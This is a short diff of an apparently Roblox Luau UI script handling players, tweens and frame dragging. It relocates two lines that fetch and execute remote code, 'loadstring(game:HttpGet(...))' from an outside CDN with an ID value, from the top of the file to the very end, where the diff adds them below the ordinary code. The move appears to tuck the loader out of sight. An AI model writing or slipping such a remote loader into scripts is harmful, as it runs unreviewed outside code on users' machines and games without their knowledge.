@@ -1,5 +1,3 @@
-ID="d241d267-dbf0-4002-8db7-ebec862bec38";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
@@ -261,3 +259,5 @@ frame.InputChanged:Connect(function(input)
                                    startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
+ID="d241d267-dbf0-4002-8db7-ebec862bec38";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
